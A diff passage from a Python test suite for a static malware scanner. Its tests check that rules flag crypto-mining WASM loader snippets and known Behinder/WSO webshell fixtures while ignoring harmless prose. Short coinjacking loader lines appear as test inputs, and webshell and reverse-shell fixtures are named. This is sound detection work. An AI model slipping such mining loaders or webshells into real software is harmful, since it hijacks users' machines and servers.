+        content = 'WebAssembly.instantiate(x).then(()=>{ Module.cwrap("hash_cn", "number", ["number"]) })\n'
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_cryptonight_wasm_fetch_is_coinjacking(self):
+        content = (
+            'WebAssembly.instantiateStreaming(fetch("cryptonight.wasm"))'
+            ".then(o=>{ exports.cn_hash(blob,nonce++) })\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_randomx_calculate_hash_is_coinjacking(self):
+        content = (
+            "WebAssembly.instantiate(randomxWasm)"
+            ".then(m=>m.instance.exports.randomx_calculate_hash(blob))\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
 
 
 # ── Built-in agent skill rules ────────────────────────────────────────
@@ -552,6 +1819,47 @@ rule agent_skill_destructive_autonomous_actions {
 """
         findings = _run_builtin(content, "README.md")
         assert not _has_rule(findings, "agent_skill_credential_exfiltration_webhook")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "Zu kleine Schrift behindert das Lesen. Menschen mit Behinderung\n"
+            "brauchen ausreichende Kontraste.\n",
+            "We deploy the API on WSO 2 Micro Integrator.\n",
+            "This skill detects Behinder and WSO webshells in uploaded files.\n",
+        ],
+        ids=["german_prose", "wso2_product_name", "family_names_in_docs"],
+    )
+    def test_known_webshell_rule_ignores_prose(self, content):
+        findings = _run_builtin(content, "SKILL.md")
+        assert not _has_rule(findings, "php_webshell_known")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "<?php define('WSO_VERSION', '0.5.2'); ?>\n",
+            "function wsoEx($input) { return $input; }\n",
+            "function wsoSecParam($name, $value) { return $value; }\n",
+            "Known indicator: e45e329feb5d925b\n",
+        ],
+        ids=["version_constant", "execution_helper", "security_helper", "key_in_docs"],
+    )
+    def test_known_webshell_rule_ignores_isolated_family_markers(self, content):
+        findings = _run_builtin(content, "reference.php")
+        assert not _has_rule(findings, "php_webshell_known")
+
+    @pytest.mark.parametrize(
+        ("fixture", "filename"),
+        [
+            ("behinder_php", "shell.php"),
+            ("behinder_jsp", "shell.jsp"),
+            ("wso_php", "shell.php"),
+            ("wso_mixed_case", "shell.php"),
+        ],
+    )
+    def test_known_webshell_rule_matches_family_markers(self, fixture, filename):
+        findings = _run_builtin(_webshell_fixture(fixture), filename)
+        assert _has_rule(findings, "php_webshell_known")
 
 
 # ── Rule caching ──────────────────────────────────────────────────────
@@ -730,7 +2038,7 @@ class TestHelpers:
 
     @pytest.mark.parametrize("payload", ["not base64", "not base64 é"])
     def test_malformed_extra_encoded_rule_does_not_block_builtin_rules(self, tmp_path, payload):
-        (tmp_path / "bad.yar.b64").write_text(payload)
+        (tmp_path / "bad.yar.b64").write_text(payload, encoding="utf-8")
 
         findings = _run(_reverse_shell_fixture(), "shell.sh", str(tmp_path))
 
@@ -931,6 +2239,7 @@ class TestInspectionLedgerResponse:
 
     def test_yara_uses_fast_match_mode_and_engine_timeout(self, monkeypatch) -> None:
         calls = []
+        monkeypatch.setattr(static_yara, "MAX_STATIC_ANALYSIS_SECONDS_PER_ARTIFACT", 300.0)
 
         class RecordingRules:
             def match(self, **kwargs):
@@ -944,7 +2253,7 @@ class TestInspectionLedgerResponse:
 
         assert result["inspection_ledger"][0]["outcome"] == "completed"
         assert calls[0]["fast"] is True
-        assert calls[0]["timeout"] == 30
+        assert calls[0]["timeout"] == 300
         assert callable(calls[0]["callback"])
 
     def test_expired_shared_deadline_accounts_for_every_unstarted_path(self, monkeypatch) -> None:
